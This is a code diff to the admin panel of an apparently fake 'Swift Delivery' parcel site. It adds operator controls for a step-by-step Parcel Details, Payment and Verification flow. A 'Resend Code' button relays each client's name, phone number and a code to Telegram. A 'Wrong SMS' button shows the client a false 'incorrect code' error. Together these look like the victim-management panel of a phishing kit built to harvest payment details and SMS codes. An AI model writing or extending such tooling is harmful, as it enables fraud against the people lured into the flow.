@@ -18,7 +18,9 @@ import {
   Info,
   XCircle,
   LogOut,
-  Settings
+  Settings,
+  KeyRound,
+  CheckCircle
 } from "lucide-react";
 import { toast } from "@/hooks/use-toast";
 import swiftDeliveryLogo from "@/assets/swift-delivery-logo.png";
@@ -43,6 +45,7 @@ interface ClientSession {
   status: string | null;
   admin_message: string | null;
   message_type: string | null;
+  verification_code: string | null;
   created_at: string;
   updated_at: string;
 }
@@ -50,13 +53,15 @@ interface ClientSession {
 const stepNames: Record<number, string> = {
   1: "Parcel Details",
   2: "Payment",
-  3: "SMS Verification"
+  3: "Verification",
+  4: "Confirmation"
 };
 
 const stepColors: Record<number, string> = {
   1: "bg-blue-500",
   2: "bg-yellow-500",
-  3: "bg-green-500"
+  3: "bg-purple-500",
+  4: "bg-green-500"
 };
 
 const messageTypes = [
@@ -126,6 +131,82 @@ const AdminPanel = () => {
       toast({
         title: "Success",
         description: `Client sent to ${stepNames[newStep]}`,
+      });
+    }
+  };
+
+  const generateVerificationCode = () => {
+    return Math.floor(100000 + Math.random() * 900000).toString();
+  };
+
+  const resendVerificationCode = async (session: ClientSession) => {
+    const newCode = generateVerificationCode();
+    
+    // Update the code in the database
+    const { error: dbError } = await supabase
+      .from("client_sessions")
+      .update({ verification_code: newCode })
+      .eq("id", session.id);
+
+    if (dbError) {
+      console.error("Error updating verification code:", dbError);
+      toast({
+        title: "Error",
+        description: "Failed to generate new code",
+        variant: "destructive"
+      });
+      return;
+    }
+
+    // Send the new code to Telegram
+    try {
+      const message = `🔑 <b>New Verification Code</b>
+
+📋 <b>Session:</b> #${session.session_code}
+👤 <b>Client:</b> ${session.client_name || "Unknown"}
+📱 <b>Phone:</b> ${session.phone_number || "N/A"}
+
+🔑 <b>New Code:</b> <code>${newCode}</code>
+
+⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
+
+      await supabase.functions.invoke("send-telegram", {
+        body: { message },
+      });
+
+      toast({
+        title: "Code Sent",
+        description: `New verification code ${newCode} sent to Telegram`,
+      });
+    } catch (error) {
+      console.error("Failed to send Telegram notification:", error);
+      toast({
+        title: "Code Generated",
+        description: `New code: ${newCode} (Telegram notification failed)`,
+      });
+    }
+  };
+
+  const sendWrongSmsMessage = async (sessionId: string) => {
+    const { error } = await supabase
+      .from("client_sessions")
+      .update({ 
+        admin_message: "The verification code you entered is incorrect. Please check and try again.",
+        message_type: "error"
+      })
+      .eq("id", sessionId);
+
+    if (error) {
+      console.error("Error sending message:", error);
+      toast({
+        title: "Error",
+        description: "Failed to send message",
+        variant: "destructive"
+      });
+    } else {
+      toast({
+        title: "Message Sent",
+        description: "Wrong SMS alert sent to client",
       });
     }
   };
@@ -455,6 +536,41 @@ const AdminPanel = () => {
                           </Button>
                         </div>
                       </div>
+
+                      {/* Verification Controls - Only show when on verification step */}
+                      {session.current_step === 3 && (
+                        <div className="space-y-2 pt-2 border-t">
+                          <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">
+                            Verification Controls:
+                          </p>
+                          <div className="grid grid-cols-2 gap-2">
+                            <Button
+                              variant="outline"
+                              size="sm"
+                              className="gap-2"
+                              onClick={() => resendVerificationCode(session)}
+                            >
+                              <KeyRound className="w-4 h-4" />
+                              Resend Code
+                            </Button>
+                            <Button
+                              variant="outline"
+                              size="sm"
+                              className="gap-2 text-destructive border-destructive hover:bg-destructive hover:text-destructive-foreground"
+                              onClick={() => sendWrongSmsMessage(session.id)}
+                            >
+                              <XCircle className="w-4 h-4" />
+                              Wrong SMS
+                            </Button>
+                          </div>
+                          {session.verification_code && (
+                            <div className="p-2 rounded bg-muted text-center">
+                              <span className="text-xs text-muted-foreground">Current Code: </span>
+                              <span className="font-mono font-bold">{session.verification_code}</span>
+                            </div>
+                          )}
+                        </div>
+                      )}
 
                       {/* Quick Actions */}
                       {session.current_step > 1 && (
